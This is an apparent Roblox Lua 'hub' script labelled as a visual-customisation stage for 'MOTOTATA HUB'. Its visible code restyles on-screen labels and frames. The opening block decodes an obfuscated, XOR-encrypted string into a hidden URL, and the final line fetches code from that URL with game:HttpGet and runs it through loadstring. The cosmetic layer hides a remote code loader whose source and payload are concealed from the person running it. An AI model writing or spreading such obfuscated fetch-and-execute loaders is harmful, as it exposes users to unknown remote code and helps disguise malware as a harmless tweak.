
--[[ STAGE 2: VISUAL CORE ]]
local CCU1qeg4pCi0XjsrvT21q="\253\230\226\153\151\142\219\134\201\254\240\196\199\050\053\025\017\016\041\026\012\022\125\116\122\126\018\114\001\114\121\102\078\086\067\068\084\068\191\162\153\175\163\071\087\139\139\136\249\176\242\247\241\220\229\226\221\203\208\130\204\048\048\056\041\054\035\044\030\020\008\206\001\120\001\049\108\107\119\091\090\080\089\077\085\184\191\065\169\177\162\172\175\091\137\152\142\064\069\181\243\245\238\227\236"local BLttovTkSS1ZqLb8c=56 local SxKmAn9pRvYeV6C0SE5=73 local S5V9twNPuD77VHw=1 local Lm2zhiWxWj4OcTgSFYPjB4=5 local LikqMXzH_C2kPNg2Ot4p=22 local XMckF5Ejh57WSbM6cBq=true local oOHApW4PNbdkB0pPc2k=bit32 and bit32.bxor if not oOHApW4PNbdkB0pPc2k then oOHApW4PNbdkB0pPc2k=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local Pk023ijk3nAcvK03TNdI={}for OLEOp0hAPigsuqdaAXf=1,#CCU1qeg4pCi0XjsrvT21q do local frQ1s3VpwkR0X48L=string.byte(CCU1qeg4pCi0XjsrvT21q,OLEOp0hAPigsuqdaAXf)local ovHPxb_yGE5j0cjrKI=(SxKmAn9pRvYeV6C0SE5+(OLEOp0hAPigsuqdaAXf*Lm2zhiWxWj4OcTgSFYPjB4)+LikqMXzH_C2kPNg2Ot4p)%256 if S5V9twNPuD77VHw==0 then frQ1s3VpwkR0X48L=(frQ1s3VpwkR0X48L-ovHPxb_yGE5j0cjrKI)%256 Pk023ijk3nAcvK03TNdI[OLEOp0hAPigsuqdaAXf]=string.char(oOHApW4PNbdkB0pPc2k(frQ1s3VpwkR0X48L,BLttovTkSS1ZqLb8c))else frQ1s3VpwkR0X48L=oOHApW4PNbdkB0pPc2k(frQ1s3VpwkR0X48L,BLttovTkSS1ZqLb8c)Pk023ijk3nAcvK03TNdI[OLEOp0hAPigsuqdaAXf]=string.char((frQ1s3VpwkR0X48L-ovHPxb_yGE5j0cjrKI)%256)end end local Zj2HTQNa9qwSAXc=table.concat(Pk023ijk3nAcvK03TNdI)if XMckF5Ejh57WSbM6cBq then Zj2HTQNa9qwSAXc=string.reverse(Zj2HTQNa9qwSAXc)end local af1MwE9oRMp8ok8CCBTL=Zj2HTQNa9qwSAXc
local HubName = "MOTOTATA HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(af1MwE9oRMp8ok8CCBTL))()
